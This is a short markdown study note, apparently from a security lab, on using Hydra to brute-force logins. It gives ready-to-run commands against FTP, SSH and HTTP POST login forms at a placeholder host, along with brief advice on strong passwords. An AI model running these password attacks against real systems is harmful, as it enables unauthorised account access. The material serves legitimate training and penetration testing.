# Hydra

## Overview
- Hydra is a fast brute-force password cracking tool.
- Used for attacking authentication services like SSH, FTP, Web Forms, SNMP, etc.
- Supports a wide range of protocols, including:
  - SSH, FTP, HTTP/HTTPS Forms, SMB, SMTP, SNMP, RDP, MySQL, MSSQL, PostgreSQL, VNC, and more.

## Importance of Strong Passwords
- Weak passwords (common, short, lacking special characters) are vulnerable.
- Default credentials (e.g., `admin:password`) should always be changed.

---

## Hydra Commands & Usage

### Brute Forcing FTP
```bash
hydra -l user -P passlist.txt ftp://MACHINE_IP
```
- `-l` → Specifies the username (`user`)
- `-P` → Password list (`passlist.txt`)
- `ftp://MACHINE_IP` → Target machine and service

### Brute Forcing SSH
```bash
hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh
```
#### Options
| Option | Description |
|--------|-------------|
| `-l`   | Specifies the SSH username |
| `-P`   | Path to password list |
| `-t`   | Number of parallel threads |

**Example:**
```bash
hydra -l root -P passwords.txt MACHINE_IP -t 4 ssh
```
- Uses `root` as the username
- Tries passwords from `passwords.txt`
- Runs 4 threads in parallel

---

## Brute Forcing Web Forms (POST)
```bash
sudo hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
```
#### Options
| Option | Description |
|--------|-------------|
| `-l`   | Username for web login |
| `-P`   | Password list |
| `http-post-form` | Indicates POST method |
| `<path>` | Login page URL (e.g., `login.php`) |
| `<login_credentials>` | Login fields (e.g., `username=^USER^&password=^PASS^`) |
| `<invalid_response>` | String indicating a failed login |
| `-V`   | Verbose mode (displays every attempt) |

**Example:**
```bash
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```
- `/:` → Login page is the main address `/`
- `username=^USER^&password=^PASS^` → Fields for input credentials
- `F=incorrect` → Server response when login fails
